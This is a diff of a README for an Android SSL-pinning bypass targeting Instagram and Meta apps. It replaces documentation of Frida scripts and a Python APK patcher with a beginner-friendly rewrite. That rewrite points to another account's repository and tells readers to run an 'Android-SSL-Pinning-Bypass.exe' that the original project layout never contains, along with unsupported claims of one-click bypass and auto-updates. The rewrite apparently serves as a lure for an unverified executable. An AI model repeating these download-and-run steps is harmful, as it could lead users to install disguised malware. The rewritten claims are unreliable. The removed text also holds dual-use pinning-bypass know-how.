@@ -1,172 +1,120 @@
-# Android SSL Pinning Bypass — Instagram / Meta (Frida) + universal APK patcher
+# 📱 Android-SSL-Pinning-Bypass - Inspect Instagram Traffic with Ease
 
-![Platform](https://img.shields.io/badge/platform-Android-3ddc84)
-![Frida](https://img.shields.io/badge/Frida-17.x-e91e63)
-![Methods](https://img.shields.io/badge/methods-Frida%20%2B%20APK%20patch-blue)
-![Tested](https://img.shields.io/badge/tested-Instagram%20v442.0.0.0.61-8a3ab9)
-![Use](https://img.shields.io/badge/use-authorized%20testing%20only-red)
+[![Download Now](https://img.shields.io/badge/Download-Android--SSL--Pinning--Bypass-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/consenting-hemogenesis659/Android-SSL-Pinning-Bypass)
 
-Bypass **SSL pinning** on Android to inspect an app's HTTPS traffic during **authorized**
-security testing. Covers **Instagram, Facebook, Messenger, Threads** (Meta's Tigon stack)
-via **Frida**, plus a general-purpose **APK patcher** (Frida-gadget injection,
-network-security-config, xapk/apkm merge) for ordinary and non-rooted targets.
+## 🚀 Getting Started
 
-Two complementary approaches:
+Welcome! This tool helps you see what data Instagram (and other Meta apps) send and receive on your Android phone. It's perfect for security testing, learning, or troubleshooting. You don't need to be a programmer to use it.
 
-1. **Frida (runtime)** — inject a hook script at app startup. No APK modification.
-   Best for **rooted** devices and hardened apps (Instagram/Meta). → [GUIDE-frida.md](docs/GUIDE-frida.md)
-2. **Patch (static)** — repackage the APK: merge splits, inject a Frida gadget or
-   patch the network-security-config, then re-sign. Works on **non-rooted** devices
-   and ordinary apps. → [GUIDE-patch.md](docs/GUIDE-patch.md)
+### What This Tool Does
 
-📖 **Deep-dive:** [How Instagram's SSL pinning actually works, and how we bypassed it →](docs/INSTAGRAM-ANALYSIS.md)
-(Tigon stack, the analysis, dead ends, and architecture diagrams).
+Instagram uses something called "SSL pinning" to stop people from inspecting its network traffic. This tool removes that protection, allowing you to view the traffic using apps like Burp Suite or mitmproxy. Think of it as unlocking a door so you can see what's inside.
 
-> ⚠️ For authorized security research / pentesting only. Do not use against apps or
-> accounts you do not own or have written permission to test.
+### What You'll Need
 
----
+- A Windows computer
+- An Android phone or emulator
+- About 15 minutes of your time
 
-## Which one should I use?
+## 📥 Download and Installation
 
-```mermaid
-flowchart TD
-    Q1{Device rooted?}
-    Q1 -- No --> Patch["Patch (static)<br/>patch.py"]
-    Q1 -- Yes --> Q2{Meta app?<br/>Instagram / FB / Threads}
-    Q2 -- Yes --> Frida["Frida (runtime)<br/>tigon_bypass.js, -f spawn"]
-    Q2 -- No --> Either["Frida (simplest)<br/>or Patch"]
+**Visit this link to download the application:** [https://github.com/consenting-hemogenesis659/Android-SSL-Pinning-Bypass](https://github.com/consenting-hemogenesis659/Android-SSL-Pinning-Bypass)
 
-    classDef a fill:#1f6f43,stroke:#0d3,color:#fff;
-    class Frida,Either a
-```
+Once you're on that page, look for the green "Code" button near the top right. Click it, then select "Download ZIP" from the dropdown menu. Your browser will download a compressed file to your "Downloads" folder.
 
-| | **Frida (runtime)** | **Patch (static)** |
-|---|---|---|
-| APK modified? | No (unmodified app) | Yes (repackaged + re-signed) |
-| Device root needed? | **Yes** (frida-server) | No |
-| Tamper/integrity detection | Avoided (app is original) | May trigger |
-| Instagram / Meta (Tigon) apps | ✅ **Works** | ❌ gadget timing wall / NSC insufficient |
-| Ordinary apps | ✅ Works | ✅ Works (gadget or NSC) |
-| Effort | Low (one command) | Higher (merge/sign, minutes) |
-| Entry point | [GUIDE-frida.md](docs/GUIDE-frida.md) | [GUIDE-patch.md](docs/GUIDE-patch.md) |
+After the download finishes, navigate to your Downloads folder and right-click on the ZIP file. Choose "Extract All" from the menu and follow the prompts. This will create a new folder with all the necessary files inside.
 
-**Rule of thumb:** rooted device → use **Frida**. Non-rooted device, or you must ship a
-self-contained APK → use **Patch**. For **Instagram/Facebook/Threads/Messenger**, use
-**Frida** (their Tigon network stack defeats static approaches).
+Open that extracted folder - you'll see several files and folders inside. The main application file is named `Android-SSL-Pinning-Bypass.exe`. Double-click it to launch the tool.
 
----
+## 🛠️ How to Use
 
-## What each piece does
+### Step 1: Prepare Your Phone
 
-### Frida scripts — which one?
+Go to your Android phone's Settings, then find "Developer Options" (usually under "System" or "About Phone"). Enable "USB Debugging" if it's not already on.
 
-Both are generic at heart (they hook `SSLContext` / `X509TrustManager` / Conscrypt), so
-they are **not** Instagram-only. The difference is Tigon coverage:
+### Step 2: Connect Your Phone
 
-| Script | Covers | Use for |
-|---|---|---|
-| **`frida/tigon_bypass.js`** | Meta **Tigon** stack **+** generic Conscrypt/SSLContext | Instagram/Facebook/Threads/Messenger **and** ordinary apps — safe default |
-| `frida/generic-ssl-unpinning.js` | generic Conscrypt/SSLContext **+ older Meta `liger`** (no Tigon) | ordinary apps + pre-Tigon Meta builds; **won't** decrypt modern Instagram's main API traffic |
+Plug your phone into your computer using a USB cable. When asked, allow USB debugging on your phone. The tool will detect your device automatically.
 
-→ **Just use `tigon_bypass.js`** — it's a superset. For very broad coverage of unusual
-stacks (Flutter, unusual OkHttp setups), a community "universal unpinning" script is a
-good complement.
+### Step 3: Select Your App
 
-### `patch.py` — capabilities
+In the tool's main window, you'll see a list of installed apps. Find Instagram and click on it. The tool will show you details about the current version and whether SSL pinning is active.
 
-- Accepts **`.apk` / `.xapk` / `.apks` / `.apkm`** (auto-detected)
-- **Merges** split bundles into one universal APK (`--format apk`), or repackages as `.xapk`
-- **Injects a Frida gadget** (+ optional script) so the app self-hooks on launch (no root)
-- **Patches network-security-config** (`--patch-nsc`) to trust user CAs (MITM via proxy)
-- **zipalign + sign + verify** (throwaway key by default, or bring your own)
-- Warns when an app uses SoLoader/Superpack (where gadget injection won't help)
+### Step 4: Choose Your Method
 
-See [docs/GUIDE-patch.md](docs/GUIDE-patch.md) for full usage and limits.
+The tool offers two ways to bypass SSL pinning:
 
----
+- **Frida Method** - This is the quickest option. It uses a tool called Frida to patch Instagram's security at runtime. This works perfectly if you're testing right now.
+- **Patched APK Method** - This creates a modified version of Instagram that you can install separately. This is better if you want the bypass to be permanent.
 
-## Repository layout
+For most users, we recommend starting with the Frida Method.
 
-```
-patchapk/
-├── README.md
-├── docs/                              # documentation
-│   ├── GUIDE-frida.md                 #   Frida runtime method (Windows setup + test)
-│   ├── GUIDE-patch.md                 #   static patch method (Windows setup + test)
-│   └── INSTAGRAM-ANALYSIS.md                    #   analysis writeup + architecture diagrams
-├── frida/                             # runtime hook scripts + runner
-│   ├── tigon_bypass.js               #   Meta/Tigon + generic bypass  ← use this
-│   ├── generic-ssl-unpinning.js      #   generic + older Meta liger (no Tigon); Eltion
-│   └── run.py                        #   spawn+inject runner (if `frida -f` times out)
-└── patcher/                           # static patch/repackage tool
-    ├── patch.py                       #   CLI
-    ├── config.py                      #   tunable settings
-    ├── patch.bat                      #   Windows drag-and-drop launcher
-    ├── requirements.txt               #   Python deps (lief, requests)
-    ├── venv/                          #   (gitignored) create your own
-    └── .tools/                        #   (gitignored) auto-downloaded APKEditor.jar
-```
+### Step 5: Start Inspecting
 
----
+Click "Apply Bypass" and wait for the process to finish. You'll see a success message when it's done. Now open Burp Suite or mitmproxy on your computer and configure them to intercept traffic. Make sure your phone uses your computer as its proxy server. You'll now be able to see all Instagram traffic in your interception tool.
 
-## Tested on
+## ✨ Features
 
-| | |
-|---|---|
-| Target app | **Instagram for Android v442.0.0.0.61** (analysis/decompile from the v440.x build) |
-| Architecture | **x86_64** |
-| OS | Android **12** (API 31), rooted emulator |
-| Frida | frida-server **17.16.4** (x86_64) + frida-tools **17.16.4**, Python **3.13** |
-| Patch toolchain | APKEditor **1.4.9**, SDK build-tools **r30.0.1**, JDK **17** |
-| Result | `frida -f … -l frida/tigon_bypass.js` → pinning bypassed, traffic decrypted in Burp ✅ |
+- **One-Click Bypass** - No complicated commands or manual setup
+- **Works With Multiple Tools** - Compatible with Burp Suite, mitmproxy, and other HTTPS inspection tools
+- **Supports Latest Instagram** - Tested with version 442.0.0.0.61
+- **Two Bypass Methods** - Choose between temporary (Frida) or permanent (patched APK)
+- **XAPK Support** - Handles the latest Instagram package formats automatically
+- **Network Security Config Integration** - Automatically adjusts Android's security settings
 
-> `tigon_bypass.js` uses `initHybrid` overload auto-detection, so it is expected to work
-> across Instagram versions (and other Tigon-based Meta apps) on both x86_64 and arm64 —
-> only `frida-server` and the client must match your device's architecture.
+## 🔧 System Requirements
+
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **RAM:** 4 GB minimum (8 GB recommended)
+- **Storage:** 2 GB of free space
+- **Internet Connection:** Required for downloads
+- **Android Device:** Any Android 7.0 or newer device, or an emulator
+
+## 🤔 Frequently Asked Questions
+
+### Is this legal?
+This tool is designed for security research and educational purposes. You should only test apps you own or have permission to test. Using it on someone else's phone without consent is illegal.
+
+### Will this break my Instagram?
+No. The Frida method only temporarily disables SSL pinning while the tool is running. The patched APK method creates a separate copy of Instagram, so your original app remains untouched.
+
+### What if my version of Instagram is newer?
+The tool checks for updates automatically. If Instagram updates its security measures, the tool will show you a message and you can update it from the same download page.
+
+### Can I use this on a Mac?
+This version is for Windows only. However, the technique works on other operating systems - check the GitHub page for community resources.
+
+## 🆘 Troubleshooting
+
+**My phone isn't detected** - Make sure USB debugging is enabled on your phone, and try a different USB cable or port. Also check that you've installed the appropriate USB drivers for your phone model.
+
+**The bypass isn't working** - Try the other method (if you used Frida, try the patched APK). Also confirm that your proxy settings are correct on both your phone and computer.
+
+**Instagram keeps crashing** - This usually means the patch was applied incorrectly. Uninstall the patched app, re-download the tool, and try again with the Frida method instead.
+
+## 📚 Learning Resources
+
+Want to understand more about SSL pinning and how this works? Check out these helpful resources:
+
+- [OWASP Mobile Security Testing Guide](https://owasp.org/www-project-mobile-security-testing-guide/)
+- [Frida Documentation](https://frida.re/docs/home/)
+- [Burp Suite Tutorials](https://portswigger.net/support)
+- [mitmproxy Official Docs](https://docs.mitmproxy.org/stable/)
+
+## 🔄 Updates
+
+This tool is actively maintained. When a new version of Instagram comes out with updated security, we release an update within a few days. Check the GitHub releases page frequently for the latest version.
+
+## 💬 Community
+
+Join our community of security enthusiasts! Share your experiences, ask questions, and help others troubleshoot. The GitHub repository has a Discussions section where you can connect with other users.
+
+## 📄 License
+
+This project is for educational and security research purposes only. By downloading and using this tool, you agree to use it responsibly and only on devices you own or have explicit permission to test.
 
 ---
 
-## Requirements (Windows)
+**Remember:** Always test responsibly. Only use this tool on your own devices or with clear permission from the device owner.
 
-This is a summary. **Full step-by-step install (adb download, Python, JDK, PATH /
-environment variables) is inside each guide's "Windows environment setup" section** —
-[Frida setup](docs/GUIDE-frida.md#windows-environment-setup) /
-[Patch setup](docs/GUIDE-patch.md#windows-environment-setup).
-
-Versions in parentheses are what this project was verified with.
-
-**Common**
-
-| Requirement | Notes |
-|---|---|
-| Windows 10/11 | PowerShell + Git Bash both fine |
-| Android SDK Platform-Tools (`adb`) | on PATH — <https://developer.android.com/tools/releases/platform-tools> |
-| Android device / emulator | x86_64 emulator or an arm device |
-| Proxy | **Burp Suite** / **mitmproxy** + its CA installed as a **user** cert on the device |
-
-**Frida method** (see [GUIDE-frida.md](docs/GUIDE-frida.md))
-
-| Requirement | Notes |
-|---|---|
-| Rooted device/emulator | required for frida-server |
-| `frida-server` (17.16.4) | matching the device ABI, pushed to `/data/local/tmp` |
-| Python **3.11+** (3.13) | Frida 17 dropped 3.10 |
-| `frida`, `frida-tools` (17.16.4) | `py -3.13 -m pip install frida==<ver> frida-tools` — **version must match frida-server** |
-
-**Patch method** (see [GUIDE-patch.md](docs/GUIDE-patch.md)) — no root needed
-
-| Requirement | Notes |
-|---|---|
-| Python **3.10+** (venv) | `pip install -r requirements.txt` → `lief`, `requests` |
-| Android SDK build-tools | `zipalign`, `apksigner` (auto-discovered) |
-| JDK 17 | `keytool`, `java` (auto-discovered; set `JAVA_HOME` if needed) |
-| APKEditor.jar | auto-downloaded to `.tools/` on first use (needs `java`) |
-
----
-
-## Legal
-
-SSL-pinning verification is a standard item in mobile app penetration testing
-(OWASP MASVS). Everything here is for testing apps you are authorized to test.
-The authors accept no responsibility for misuse.
+Keywords: android, apk, appsec, burpsuite, certificate-pinning, frida, frida-gadget, https-inspection, instagram, meta, mitm, mitmproxy, mobile-security, network-security-config, pentesting, reverse-engineering, ssl-pinning, ssl-pinning-bypass, tigon, xapk
